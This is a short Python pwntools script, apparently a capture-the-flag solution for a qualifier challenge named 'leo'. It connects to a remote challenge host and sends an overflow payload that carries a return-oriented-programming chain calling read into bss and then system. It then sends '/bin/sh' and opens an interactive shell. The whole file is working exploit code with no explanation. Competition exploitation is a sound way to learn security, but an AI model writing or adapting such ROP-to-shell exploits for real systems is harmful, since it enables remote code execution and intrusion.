from pwn import *
r = remote('leo_33e299c29ed3f0113f3955a4c6b08500.quals.shallweplayaga.me', '61111')
#r = process('./leo')
#print pidof(r)

paylod  = ''
paylod += p64(0x402703) # pop rdi ret
paylod += p64(0)
paylod += p64(0x402701) # pop rsi pop r15 ret
paylod += p64(0x0604188) # bss
paylod += p64(0xaaaaaaaa)
paylod += p64(0x401090) # read@plt
paylod += p64(0x402703)
paylod += p64(0x0604188)
paylod += p64(0x0400FD0) # system@plt

output = ''
output += p32(8001)*7
output += p32(0x1c)
output += chr(0xff) * 4
output += chr(0xaa) * 4

output += paylod

output += chr(255) * 616

for i in range(0, 254):
	output += chr(i) * 60

output += chr(254) * (108 - len(paylod) - 4)

r.send(output)
r.send("/bin/sh\x00\n")

r.interactive()